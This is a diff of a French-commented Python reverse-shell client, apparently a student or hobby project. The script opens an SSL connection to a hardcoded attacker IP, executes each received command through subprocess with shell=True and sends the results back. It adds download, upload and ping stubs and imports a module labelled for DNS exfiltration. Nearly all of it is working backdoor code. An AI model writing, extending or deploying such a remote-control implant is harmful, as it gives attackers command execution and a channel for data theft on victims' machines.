@@ -2,17 +2,13 @@
 # Version 0.5
 # Auteur : Raphaël KATHALUWA-LIYANAGE
 
-# import des librairies suivantes :
-# socket = communication entre l'attaquant et la cible
-# ssl = chiffrement des échanges
-# subprocess = exécution des commandes
-# os = manipulation des commandes de l'OS
-import socket
-import ssl
-import subprocess
-import os
-import shutil
-import dns_client
+# import des librairies
+import socket       # communication entre l'attaque et la cible
+import ssl          # chiffrement des échanges
+import subprocess   # retourner le résultats des commandes à l'attaquant
+import os           # exécuter des commandes systèmes
+import shutil       # manipuler les fichiers
+import dns_client   # exfiltration via DNS
 
 # /!\ MODIFIER @ HOST AVANT D'EXECUTER LE PROGRAMME
 HOST = '192.168.1.6'
@@ -38,7 +34,6 @@ try:
         received_data = wrappedSocket.recv(BUFFER_SIZE)
         # Send the output of the command over the SSL connection
         # Execute a system command
-
         cmd = received_data.decode().split()
         # la commande a-t-elle des paramètres ?
         if cmd[0] == "cd" or cmd[0] == "CD":
@@ -77,6 +72,12 @@ try:
         elif cmd[0] == "whoami":
             output = os.environ.get('USERNAME')
             wrappedSocket.sendall(output.encode())
+        elif cmd[0] == "download":
+            wrappedSocket.sendall(cmd[0].encode())
+        elif cmd[0] == "upload":
+            wrappedSocket.sendall(cmd[0].encode())
+        elif cmd[0] == "ping":
+            wrappedSocket.sendall(cmd[0].encode())
         else:
             command = subprocess.Popen(cmd, shell=True,
                                        stdout=subprocess.PIPE, 
@@ -88,18 +89,6 @@ try:
                 wrappedSocket.sendall(err)
             else:
                 wrappedSocket.sendall("[-] Error: couldn't send data".encode())
-        """
-        elif cmd[0] == "cp" or cmd[0] == "CP":
-            send(cmd)
-        elif cmd[0] == "rm" or cmd[0] == "RM":
-            send(cmd)
-        elif cmd[0] == "ping":
-            send(cmd)
-        elif cmd[0] == "download":
-            send(cmd)
-        elif cmd[0] == "upload":
-            send(cmd)
-        """
 except Exception:
     exit(-1)
 finally:
